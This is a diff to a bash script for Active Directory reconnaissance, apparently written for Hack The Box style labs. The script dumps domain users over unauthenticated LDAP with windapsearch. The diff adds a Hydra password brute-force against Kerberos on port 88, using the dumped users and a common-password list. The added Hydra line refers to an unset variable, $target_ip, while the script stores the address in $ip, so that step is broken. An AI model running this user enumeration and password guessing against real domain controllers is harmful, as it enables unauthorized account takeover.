@@ -1,5 +1,8 @@
 #!/bin/bash
 
+user_list="/tmp/windapsearch-noauth-allusers.txt"
+password_list="/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
+
 echo -n "Enter Domain Name i.e htb.local [ENTER]: "
 read domain
 echo -n "Enter Domain Controller IP Address [ENTER]: "
@@ -22,6 +25,9 @@ sudo rm /tmp/windapsearch-auth-unconstrained-computers.txt
 
 #Run LDAP Query WITHOUT Credentials and dump all users
 /tmp/windapsearch -d $domain --dc $ip -m users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-noauth-allusers.txt
+
+echo "Running Hydra against Kerberos on TCP port 88"
+hydra -L "$user_list" -P "$password_list" -t 4 -u -vV -s 88 $target_ip kerberos
 
 #Run LDAP Query WITH Credentials and dump all users
 /tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-allusers.txt
